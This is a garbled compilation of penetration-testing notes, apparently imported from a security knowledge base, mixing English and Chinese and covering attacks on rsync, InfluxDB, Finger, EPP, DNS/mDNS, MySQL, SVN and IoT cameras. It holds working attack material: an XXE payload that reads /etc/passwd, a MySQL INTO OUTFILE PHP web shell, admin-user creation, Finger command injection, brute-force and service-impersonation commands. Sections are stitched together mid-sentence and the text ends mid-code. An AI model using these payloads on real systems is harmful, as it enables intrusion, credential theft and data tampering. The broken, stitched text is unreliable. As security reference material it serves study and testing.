To identify available modules and check if they require passwords, the following commands are used: Be aware that some shares might not appear in the list, possibly hiding them. Additionally, accessing some shares might be restricted to specific 凭据，indicated by an "Access Denied" message. With 凭据，listing and downloading from a shared folder can be done as follows, where a 密码 prompt will appear: To 上传 content, such as an authorized keys file for access, use: To locate the rsyncd configuration file, execute: Within this file, a secrets file parameter might point to a file containing usernames and passwords for rsyncd 认证. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE REASON873/tcp open rsync syn-ack # 2. Banner & Manual communication 12345678910111213141516171819nc -vn 127.0.0.1 873(UNKNOWN) [127.0.0.1] 873 (rsync) open@RSYNCD: 31.0 <--- You receive this banner with the version from the server@RSYNCD: 31.0 <--- Then you send the same info#list <--- Then you ask the sever to listraidroot <--- The server starts enumeratingUSBCopyNAS_Public_NAS_Recycle_TOSRAID <--- Enumeration finished@RSYNCD: EXIT <--- Sever closes the connection#Now lets try to enumerate "raidroot"nc -vn 127.0.0.1 873(UNKNOWN) [127.0.0.1] 873 (rsync) open@RSYNCD: 31.0@RSYNCD: 31.0raidroot@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g <--- This means you need the password # 3. Enumerating Shared Folders 12345nmap -sV --script "rsync-list-modules" -p <PORT> <IP>msf> use auxiliary/scanner/rsync/modules_list# Example with IPv6 and alternate portrsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730 # 4. Manual Rsync Usage 12345# Listing a shared folderrsync -av --list-only rsync://192.168.0.123/shared_name# Copying files from a shared folderrsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared # 5. content: 来源路径： 02-知识点/侦察与枚举/8086：Pentesting InfluxDB 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 8086：Pentesting InfluxDB 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 8086：Pentesting InfluxDB 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 8086：Pentesting InfluxDB 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：8086：Pentesting InfluxDB、Basic Information、Identify & Version (HTTP)、枚举、认证；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 8086：Pentesting InfluxDB Basic Information Identify & Version (HTTP) 枚举 认证 Manual 枚举 (v1 HTTP API / InfluxQL) Show databases Show tables/measurements Show columns/field keys Dump Table InfluxDB v2.x API (令牌 - based) Automated 枚举 Recent vulns and privesc of interest (last years) # 核心要点 If you get an error like this one: ERR: unable to parse 认证 凭据 it means that it's expecting some 凭据. There was a 漏洞 influxdb that allowed to 绕过 the 认证: CVE-2019-20933 In some testing with the 认证 绕过 it was noted that the name of the table needed to be between double quotes like: select * from "cpu" If 认证 is disabled, you can even create users and escalate: InfluxDB 2.x introduces 令牌 - based auth and a new API (still on 8086 by default). If you obtain a 令牌 (leaked logs, default deployments, backups) you can enumerate: For v1.8+, some v2-compatible endpoints exist (/api/v2/query, /api/v2/write, /health). This is useful if the server is v1 but accepts v2-style requests. In v2, the HTTP 授权 header must be in the form 令牌 <value>. Many legacy 1.x deployments still expose /query and /write unauthenticated on the Internet. If auth is disabled, you can dump or even modify time-series at will; you may also create admin users as shown above. Always verify with the HTTP API even if the CLI blocks you. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE VERSION8086/tcp open http InfluxDB http admin 1.7.5 # 2. Identify & Version (HTTP) 12345# v1 banner grabcurl -i http://<host>:8086/ping# v2/compat healthcurl -s http://<host>:8086/health | jq . # 3. 认证 123# Try unauthenticated CLI (v1 shell)influx -host <host> -port 8086> use _internal # 4. 认证 1influx –username influx –password influx_pass # 5. Manual 枚举 (v1 HTTP API / InfluxQL) 12345678910111213141516171819202122232425# List databases (unauth)curl -sG "http://<host>:8086/query" --data-urlencode "q=SHOW DATABASES"# List retention policies of a DBcurl -sG "http://<host>:8086/query" --data-urlencode "db=telegraf" --data-urlencode "q=SHOW RETENTION POLICIES ON telegraf"# List users (if auth disabled)curl -sG "http://<host>:8086/query" --data-urlencode "q=SHOW USERS"# List measurements (tables)curl -sG "http://<host>:8086/query" --data-urlencode "db=telegraf" --data-urlencode "q=SHOW MEASUREMENTS"# List field keys (columns)curl -sG "http://<host>:8086/query" --data-urlencode "db=telegraf" --data-urlencode "q=SHOW FIELD KEYS"# Dump data from a measurementcurl -sG "http://<host>:8086/query" \ --data-urlencode "db=telegraf" \ --data-urlencode 'q=SELECT * FROM "cpu" LIMIT 5' | jq .# Force epoch timestamps (useful for tooling)curl -sG "http://<host>:8086/query" \ --data-urlencode "epoch=ns" \ --data-urlencode "db=telegraf" \ --data-urlencode 'q=SELECT * FROM "cpu" LIMIT 5' # 6. Manual 枚举 (v1 HTTP API / InfluxQL) 123# Create an admin user (v1, auth disabled)curl -sG "http://<host>:8086/query" \ --data-urlencode "q=CREATE USER hacker WITH PASSWORD 'P@ssw0rd!' WITH ALL PRIVILEGES" # 7. Show databases 123456> show databasesname: databasesname----telegraf_internal # 8. Show tables/measurements 123456789101112> show measurementsname: measurementsname----cpudiskdiskiokernelmemprocessesswapsystem # 9. Show columns/field keys 123456789101112131415161718> show field keysname: cpufieldKey fieldType-------- ---------usage_guest floatusage_guest_nice floatusage_idle floatusage_iowait floatname: diskfieldKey fieldType-------- ---------free integerinodes_free integerinodes_total integerinodes_used integer[ ... more keys ...] # 10. Dump Table 123456select * from cpuname: cputime cpu host usage_guest usage_guest_nice usage_idle usage_iowait usage_irq usage_nice usage_softirq usage_steal usage_system usage_user---- --- ---- ----------- ---------------- ---------- ------------ --------- ---------- ------------- ----------- ------------ ----------1497018760000000000 cpu-total ubuntu 0 0 99.297893681046 0 0 0 0 0 0.35105315947842414 0.351053159478424141497018760000000000 cpu1 ubuntu 0 0 99.69909729188728 0 0 0 0 0 0.20060180541622202 0.10030090270811101 # 11. A daemon may disclose: home directories, shells, last login times, and TTYs RFC 1288 explicitly allows implementations to execute a user-controlled program in response to a Finger query, which is where the classic |/bin/... abuse comes from. This is rare today, but if you find a custom or legacy daemon, test carefully for: shell metacharacters in username handling backend wrappers that pass the username to a shell script or CGI the relay can be used to enumerate internal users from an exposed Finger service # 命令 / 载荷 / 操作片段 # 1. Basic Info 12PORT STATE SERVICE79/tcp open finger # 2. Banner Grabbing/Basic connection 1234nc -vn <IP> 79echo "root" | nc -vn <IP> 79printf '
' | nc -vn <IP> 79 # Null query: ask for logged-in usersprintf '/W root
' | nc -vn <IP> 79 # Long format, if the daemon supports it # 3. User 枚举 1234finger @<Victim> #List usersfinger admin@<Victim> #Get info of userfinger user@<Victim> #Get info of userfinger -l user@<Victim> #Long format from common UNIX clients # 4. User 枚举 1234finger-user-enum.pl -U users.txt -t 10.0.0.1finger-user-enum.pl -u root -t 10.0.0.1finger-user-enum.pl -U users.txt -T ips.txtfinger-user-enum.pl -U users.txt -t 10.0.0.2 -r 10.0.0.1 # 5. User 枚举 123456789# Null query: enumerate currently logged-in usersprintf '
' | nc -vn <IP> 79# Long formatprintf '/W
' | nc -vn <IP> 79printf '/W root
' | nc -vn <IP> 79# Spray several likely accounts in one go against permissive daemonsprintf 'root admin oracle mysql ftp user test
' | nc -vn <IP> 79 # 6. Nmap execute a script for doing using default scripts 12nmap -sV -sC -p79 <IP>nmap --script finger -p79 <IP> # 7. Metasploit uses more tricks than Nmap 1use auxiliary/scanner/finger/finger_users # 8. Command execution 12finger "|/bin/id@example.com"finger "|/bin/ls -a /@example.com" # 9. Finger Bounce 12finger user@host@victimfinger @internal@external # 10. Finger Bounce 12345# Ask 10.0.0.1 to finger root on 10.0.0.2printf 'root@10.0.0.2
' | nc -vn 10.0.0.1 79# Enumerate usernames on 10.0.0.2 through relay 10.0.0.1finger-user-enum.pl -U users.txt -t 10.0.0.2 -r 10.0.0.1 # 工具与参考入口 pentestmonkey Use a system as a finger relay RFC 1288：The Finger User Information Protocol Finger.exe on LOLBAS # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/侦察与枚举/700：Pentesting EPP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 700：Pentesting EPP 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 700：Pentesting EPP 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 700：Pentesting EPP 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：700：Pentesting EPP、Basic Information、Pentest、枚举 & 侦察、Open-source clients useful for testing；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 700：Pentesting EPP Basic Information Pentest 枚举 & 侦察 Open-source clients useful for testing Common Weaknesses & 2023-2025 Vulnerabilities XXE / SSRF 载荷 (works against many Java/Spring implementations) Other typical findings Attack Path: From Zero to TLD Hijack Defensive Measures & Hardening # 核心要点 EPP servers almost always listen on TCP 700/tcp over TLS. A typical deployment also enforces mutual-TLS (mTLS) so the client must present a valid certificate issued by the registry CA. Nevertheless, many private test or pre-production deployments forget that control: Weak credential policy – EPP login passphrases shorter than 8 chars; brute-force is often feasible because the spec only RECOMMENDS (not requires) rate-limiting. Missing registryLock / serverUpdateProhibited status – once authenticated, attackers can immediately update NS records and steal traffic. Abuse one of the weaknesses above to gain registrar-level 凭据 (XXE → SSRF to IMDSv1, credential exfil, or TLS - 绕过). Issue <update> requests to change the domain’s hostObj records to attacker-controlled name servers. (Optional) Submit a <transfer> to move the domain to an attacker-controlled registrar – many registries still rely on a single auth-code. Enforce mTLS with per-registrar client certificates and pin the registry CA. # 命令 / 载荷 / 操作片段 # 1. 枚举 & 侦察 123456# Banner-grabbing / TLS inspectionnmap -p700 --script ssl-cert,ssl-enum-ciphers <target># Check if mTLS is *really* required (it frequently is not!)openssl s_client -connect <target>:700 -quiet \ -servername epp.test 2>/dev/null | head # 2. 枚举 & 侦察 1234<?xml version="1.0" encoding="UTF-8"?><epp xmlns="urn:ietf:params:xml:ns:epp-1.0"> <hello/></epp> # 3. Open-source clients useful for testing 12345678910111213package mainimport ( "github.com/domainr/epp" "crypto/tls")func main() { cfg := &tls.Config{InsecureSkipVerify: true} c, _ := epp.DialTLS("epp.test:700", cfg) c.Login("CLIENT_ID", "PASSWORD", nil) resp, _ := c.DomainCheck("example","com") println(resp)} # 4. XXE / SSRF 载荷 (works against many Java/Spring implementations) 1234567891011<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><epp xmlns="urn:ietf:params:xml:ns:epp-1.0"> <command> <check> <domain:check xmlns:domain="urn:ietf:params:xml:ns:domain-1.0"> <domain:name>&xxe;</domain:name> </domain:check> </check> </command></epp> # 工具与参考入口 In this very interesting article # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 SSRF 服务端请求伪造 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

On Netatalk targets this metadata backend also matters for exploitability: Metasploit (>= 6.3) ships the module 利用 /linux/netatalk/parse entries which delivers the 载荷 via DSI WRITE. If the target runs an affected QNAP/Synology firmware, successful 利用 yields a shell as root. CVE-2022-45188: a specially crafted .appl file can trigger a heap overflow in afp getappl; this is especially relevant if you can write files into a share and the server runs FCE / notify features. CVE-2024-38439 / CVE-2024-38440 / CVE-2024-38441: one-byte heap out-of-bounds writes in login-related paths fixed in Netatalk 2.4.1 / 3.1.19 / 3.2.1. These bugs are interesting because exploitability depends on the configured UAMs: uams dhx.so + PAM-backed DHX login reaches the vulnerable path for CVE-2024-38440. CVE-2022-22995 – Symlink redirection leading to arbitrary 文件写入 / RCE when AppleDouble v2 is enabled (3.1.0：3.1.17). CVE-2010-0533 – 目录穿越 in Apple Mac OS X 10.6 AFP (detected by afp-path-vuln.nse). # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE548/tcp open afp # 2. Quick banner / server info 123456# Metasploit auxiliaryuse auxiliary/scanner/afp/afp_server_inforun RHOSTS=<IP># Nmap NSEnmap -p 548 -sV --script "afp-* and not dos" <IP> # 3. Quick banner / server info 1hydra -L users.txt -P passwords.txt afp://<IP> # 4. Quick banner / server info 12nmap -p 548 --script afp-serverinfo,afp-showmount,afp-ls \ --script-args 'afp.username=<USER>,afp.password=<PASS>,ls.maxdepth=2,ls.maxfiles=50' <IP> # 5. If they can't provide a response, the query is escalated to the root servers. Resolver: Integrated within computers or routers, resolvers execute name resolution locally and are not considered authoritative. Another tool to do so: https://github.com/amine7536/reverse-scan If DNS recursion is enabled, an attacker could spoof the origin on the UDP packet in order to make the DNS send the response to the victim server. An attacker could abuse ANY or DNSSEC record types as they use to have the bigger responses.\ The HackTricks Domain/DNS auditor was expanded with extra DNS/certificate checks. Attacker abuse 利用 lame/out-of-sync delegation to increase reliability of cache-poisoning windows and selective traffic disruption. Not usually direct 利用，but can reduce defensive control over client connection behavior. If attacker gets brief write access to DNS, low TTL accelerates malicious redirection rollout. issue /issuewild breadth and over-permissive CA 授权 # 命令 / 载荷 / 操作片段 # 1. Basic Information 1234PORT STATE SERVICE REASON53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)5353/udp open zeroconf udp-response53/udp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) # 2. Banner Grabbing 1dig version.bind CHAOS TXT @DNS # 3. Banner Grabbing 1--script dns-nsid # 4. Any record 1dig any victim.com @<DNS_IP> # 5. Zone Transfer 123dig axfr @<DNS_IP> #Try zone transfer without domaindig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domainfierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack # 6. More info 12345678910dig ANY @<DNS_IP> <DOMAIN> #Any informationdig A @<DNS_IP> <DOMAIN> #Regular DNS requestdig AAAA @<DNS_IP> <DOMAIN> #IPv6 DNS requestdig TXT @<DNS_IP> <DOMAIN> #Informationdig MX @<DNS_IP> <DOMAIN> #Emails relateddig NS @<DNS_IP> <DOMAIN> #DNS that resolves that namedig -x 192.168.0.2 @<DNS_IP> #Reverse lookupdig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup#Use [-p PORT] or -6 (to use ivp6 address of dns) # 7. Automation 123for sub in $(cat <WORDLIST>);do dig $sub.<DOMAIN> @<DNS_IP> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;donednsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN> # 8. Using nslookup 1234nslookup> SERVER <IP_DNS> #Select dns server> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...> <IP_MACHINE> #Reverse lookup of a machine, maybe... # 9. Useful nmap scripts 12#Perform enumeration actionsnmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP> # 11. DNS：Reverse BF 1234dnsrecon -r 127.0.0.0/24 -n <IP_DNS> #DNS reverse of all of the addressesdnsrecon -r 127.0.1.0/24 -n <IP_DNS> #DNS reverse of all of the addressesdnsrecon -r <IP_DNS>/24 -n <IP_DNS> #DNS reverse of all of the addressesdnsrecon -d active.htb -a -n <IP_DNS> #Zone transfer # 12. Combine with NTLM 中继 techniques when Windows clients negotiate auth to spoofed services. Also see generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows: Apple mDNSResponder correctness issue (CVE-2025-31222) allowed local 权限提升 via mDNSResponder; useful for 持久化 on unmanaged Macs/iPhones, fixed in recent iOS/macOS updates. Network Exploration and 枚举 1nmap -sU -p 5353 --script=dns-service-discovery <target> # 3. Network Exploration and 枚举 1sudo nmap --script=broadcast-dns-service-discovery # 4. Network Exploration and 枚举 1234# List service types avahi-browse -bt _services._dns-sd._udp # Browse all services and resolve to host/port avahi-browse -art # 5. Network Exploration and 枚举 123456# Browse all HTTP services dns-sd -B _http._tcp # Enumerate service types dns-sd -B _services._dns-sd._udp # Resolve a specific instance to SRV/TXT dns-sd -L "My Printer" _ipp._tcp local # 6. Network Exploration and 枚举 1234# Live capture sudo tshark -i <iface> -f "udp port 5353" -Y mdns # Only DNS-SD service list queries sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\"" # 7. mDNS name probing interference (DoS / name squatting) 12# Block new devices from taking names by auto-faking responsessudo python3 pholus3.py <iface> -afre -stimeout 1000 # 8. Service spoofing and impersonation (MitM) 123456789101112131415161718# Start mDNS/DNS-SD discoverysudo bettercap -iface <iface> -eval "zerogod.discovery on"# Show all services seen from a host> zerogod.show 192.168.1.42# Show full DNS records for a host (newer bettercap)> zerogod.show-full 192.168.1.42# Impersonate all services of a target host automatically> zerogod.impersonate 192.168.1.42# Save IPP print jobs to disk while impersonating a printer> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/> zerogod.impersonate 192.168.1.42# Replay previously captured services> zerogod.save 192.168.1.42 target.yml> zerogod.advertise target.yml # 9. Defensive considerations and OPSEC 1HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD) # 10. Tooling quick reference 12345678# Passive sniff (timeout seconds) sudo python3 pholus3.py <iface> -stimeout 60 # Enumerate service types sudo python3 pholus3.py <iface> -sscan # Send generic mDNS requests sudo python3 pholus3.py <iface> --request # Reverse mDNS sweep of a subnet sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24 # 工具与参考入口 Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things Nmap NSE: broadcast-dns-service-discovery bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation) Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory Rapid7 advisory for Apple mDNSResponder CVE-2024-44183 Rapid7 writeup of Apple mDNSResponder CVE-2025-31222 # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It allows to package YAML files and distribute them in public and private repositories. These packages are called Helm Charts. Tiller is the service running by default in the port 44134 offering the service. If you can enumerate pods and/or services of different namespaces enumerate them and search for the ones with "tiller" in their name: Once you have discovered it you can communicate with it downloading the client helm application. You can use 工具 like homebrew, or look at the official releases page**.** For more details, or for other options, see the installation guide. Then, you can enumerate the service: By default Helm2 was installed in the namespace kube-system with high privileges, so if you find the service and has access to it, this could allow you to escalate privileges. All you need to do is to install a package like this one: https://github.com/Ruil1n/helm-tiller-Pwn 二进制利用 that will give the default service 令牌 access to everything in the whole cluster. # 命令 / 载荷 / 操作片段 # 1. ICANN sunset WHOIS for gTLD registration data on 2025-01-28, making RDAP the protocol to prefer for machine-readable domain registration lookups. If your goal is reverse whois, broader asset expansion, or recursive external 侦察，check the External 侦察 方法论 page to avoid duplicating work here. shell wrappers around other lookup 工具 So fuzz with 载荷 for SQL 注入，LDAP 注入，delimiter abuse, very long strings, and malformed UTF-8 /control characters. The protocol itself is simple; the dangerous part is usually the parser or backend glue code. A relevant 2024-2025 attack path is abusing outdated WHOIS trust. If a registry or tool changes its WHOIS hostname and the old domain expires, an attacker may be able to register the old hostname and operate a rogue WHOIS server. That gives the attacker control over the response body seen by: parser bugs / 命令注入 /eval bugs in libraries consuming the text response bad automation decisions when systems trust attacker-controlled WHOIS contact data # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE43/tcp open whois? # 2. Enumerate 12whois -h <HOST> -p <PORT> "domain.tld"printf 'domain.tld
' | nc -vn <HOST> <PORT> # 3. Enumerate 123456# Domainprintf 'example.com
' | nc -vn <HOST> 43# IP / CIDR / ASN examplesprintf '8.8.8.8
' | nc -vn <HOST> 43printf 'AS15169
' | nc -vn <HOST> 43 # 4. Referral Chasing and Better 枚举 12345678910# Ask IANA first and then follow the authoritative referral (common Linux whois clients)whois -I example.comwhois -I 8.8.8.8# Let Nmap follow domain/IP WHOIS referrals automaticallynmap --script whois-domain <target>nmap --script whois-ip <target># For IP ranges, disable the WHOIS cache if you care about smaller delegated blocksnmap --script whois-ip --script-args whois.whodb=nocache <target> # 5. RDAP as the Structured Successor 12curl -s https://www.rdap.net/domain/example.com | jqcurl -s https://rdap.arin.net/registry/ip/8.8.8.8 | jq # 6. HackTricks Automatic Commands 12345678910111213141516171819202122Protocol_Name: WHOIS #Protocol Abbreviation if there is one.Port_Number: 43 #Comma separated if there is more than one.Protocol_Description: WHOIS #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for WHOIS Note: | The WHOIS protocol serves as a standard method for inquiring about the registrants or holders of various Internet resources through specific databases. These resources encompass domain names, blocks of IP addresses, and autonomous systems, among others. Beyond these, the protocol finds application in accessing a broader spectrum of information. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.htmlEntry_2: Name: Banner Grab Description: Grab WHOIS Banner Command: whois -h {IP} -p 43 {Domain_Name} && printf '{Domain_Name}
' | nc -vn {IP} 43Entry_3: Name: Nmap WHOIS Referrals Description: Follow WHOIS referrals for domain and IP lookups Command: nmap --script whois-domain,whois-ip --script-args whois.whodb=nocache {IP} # 工具与参考入口 ICANN Update: Launching RDAP; Sunsetting WHOIS # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If the record returns NXDOMAIN, a low-privileged domain user can recreate it thanks to default dynamic-update ACLs. See AD DNS Records abuse for background. Register the hostname to an attacker-controlled IP: For longer engagements, run the official server locally (git clone https://github.com/nats-io/nats-server && go build && ./nats-server -V). TRACE logging already shows usernames; removing the redaction helper or sniffing traffic with Wireshark reveals the full 密码. Once any credential is recovered (e.g. Dev Account A), store it as a CLI context to avoid retyping: Streaming teams frequently log 认证 events into subjects such as logs.auth. If developers persist the raw JSON into a JetStream stream, the 载荷 may include plaintext AD usernames and passwords: Enforce TLS (tls, tls required, or mTLS via nkey/creds). Without encryption, INFO/CONNECT leaks 凭据 to anyone on-path. Disable credential logging. Scrub secrets before publishing to subjects, set JetStream retention/age limits, and apply deny delete=false only to trusted operators. # 命令 / 载荷 / 操作片段 # 1. If you can list, try checkout to dump secrets, scripts, CI tokens. Repositories frequently store build pipelines, deployment keys, and database 凭据 in versioned config files. Grep the working copy after checkout: grep -R "密码 | secret | 令牌" -n .. If svn+ssh is enabled, user shells often allow restricted svnserve commands; attempt ssh user@host svnserve -t with crafted subcommands to 绕过 wrappers. sasl 认证 (if enabled) and simple 密码 files are protected only by the transport; no lockout by default. A quick Bash loop can try 凭据: A user with commit rights can write a path containing control chars (e.g. \x01, \x7f) that corrupts the repository, making later checkouts/logs fail and potentially crashing mod dav svn workers. On Windows, "best-fit" character encoding in svn.exe allows command-line argument injection when processing specially crafted non‑ASCII paths/URLs, potentially leading to arbitrary program execution. Affects Subversion ≤ 1.14.3 on Windows only; fixed in 1.14.4. Attack surface: phishing a developer to run svn on an attacker-controlled URL/path. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE3690/tcp open svnserve Subversion # 2. Banner Grabbing 123nc -vn 10.10.10.10 3690svnserve --version # if shell access is obtainedsvn --version # client version leak via error messages # 3. 枚举 1234567891011121314# Anonymous / authenticated listingsvn ls svn://10.10.10.203 # list rootsvn ls -R svn://10.10.10.203/repo # recursive listsvn info svn://10.10.10.203/repo # repo metadatasvn log svn://10.10.10.203/repo # commit historysvn checkout svn://10.10.10.203/repo # checkout repositorysvn up -r 2 # move working copy to revision 2svn diff -r 1:HEAD svn://10.10.10.203/repo # view changes# If served over HTTP(S)svn ls https://10.10.10.10/svn/repo --username guest --password ''# Extract revision props (often contain build creds, URLs, tokens)svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo # 4. When the interpreter is implicitly executed by a CGI script (for example /cgi-bin/ml-draw.py with shebang #!/bin/python) the 载荷 is executed with the same privileges as the web-server process (FortiWeb ran it as root → full pre-auth RCE). Example .pth 载荷 (single line, no spaces can be included in the final SQL 载荷，so hex/UNHEX () or string concatenation may be required): INTO OUTFILE cannot overwrite existing files; choose a new filename. The file path is resolved relative to MySQL’s CWD, so prefixing with ../../helps to shorten the path and 绕过 absolute-path restrictions. If the attacker input is extracted with %128s (or similar) any space will truncate the 载荷；use MySQL comment sequences /**/or/!/ to replace spaces. The MySQL user running the query needs the FILE privilege, but in many appliances (e.g. FortiWeb) the service runs as root, giving write access almost everywhere. In this paper you can see a complete description of the attack and even how to extend it to RCE: https://paper.seebug.org/1113/\ Here you can find an overview of the attack: http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/ The user setting is utilized for designating the user under which the MySQL service will be executed. 密码 is applied for establishing the 密码 associated with the MySQL user. # 命令 / 载荷 / 操作片段 # 1. Basic Information 13306/tcp open mysql # 2. Local 12mysql -u root # Connect to root without passwordmysql -u root -p # A password will be asked (check someone) # 3. Remote 12mysql -h <Hostname> -u rootmysql -h <Hostname> -u root@localhost # 4. External 枚举 1234567nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>msf> use auxiliary/scanner/mysql/mysql_versionmsf> use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf> use auxiliary/scanner/mysql/mysql_hashdump #Credsmsf> use auxiliary/admin/mysql/mysql_enum #Credsmsf> use auxiliary/scanner/mysql/mysql_schemadump #Credsmsf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds # 5. Write any binary data 12CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)CONVERT(from_base64("aG9sYWFhCg=="), BINARY) # 6. MySQL commands 1234567891011121314151617181920212223242526272829show databases;use <database>;connect <database>;show tables;describe <table_name>;show columns from <table>;select version(); #versionselect @@version(); #versionselect user(); #Userselect database(); #database name#Get a shell with the mysql client user\! sh#Basic MySQLiUnion Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tablesUnion Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"#Read & Write## Yo need FILE privilege to read & write to files.select load_file('/var/lib/mysql-files/key.txt'); #Read fileselect 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'#Try to change MySQL root passwordUPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';FLUSH PRIVILEGES;quit; # 7. MySQL commands 12mysql -u username -p < manycommands.sql #A file with all the commands you want to executemysql -u root -h 127.0.0.1 -e 'show databases;' # 8. Known plaintext and error-string responses make them easy to identify in traffic captures and with Internet scanners. LAN discovery: devices often reply to an unencrypted search on local broadcast. Use Paul Marrapese’s script to enumerate: Some control messages (e.g., MSG REPORT SESSION READY) are always encrypted with a library-hardcoded key shared across apps. Common 漏洞 in LookCam-class devices: Firmware ignores both the LoginDev flow and per-request pwd fields (CWE-287, CWE-306). The device accepts operational commands without validating a 密码. 利用: do not send LoginDev or ignore its result; send commands directly. searchWiFiList – shells out to iwlist; leaves raw output in /tmp/wifi scan.txt. DownloadFile – arbitrary path read primitive without path restrictions. Impact: straightforward single-stage shellcode or classic ROP 返回导向编程 /ret2libc on the device’s CPU (e.g., ARM) for full compromise and LAN pivoting. From app UI or AP SSID; otherwise enumerate PREFIX+number and brute 22^5 verifier space. Send {"cmd":"searchWiFiList"}; then DownloadFile "/tmp/wifi scan.txt"; submit BSSIDs to a geolocation API. Send a cmd > 255 bytes to trigger the stack overflow; build ROP 返回导向编程 /ret2libc or drop shellcode (no canary/DEP/ASLR). # 命令 / 载荷 / 操作片段 # 1. Weak “Encryption” and Key Recovery 12345# ciphertext: captured bytes of an encrypted registration message# known: guessed/known plaintext region (e.g., JSON or constant header)keystream = bytes([c ^ p for c, p in zip(ciphertext[:len(known)], known)])# Decrypt more bytes by XORing with the repeating keystreampt = bytes([c ^ keystream[i % len(keystream)] for i, c in enumerate(ciphertext)]) # 2. Control Plane: JSON Commands and Auth 绕过 1234{ "cmd": "LoginDev", "pwd": "123456"} # 3. Memory-Safety to RCE on Embedded Firmware 1234char buf[256];char *cmd = 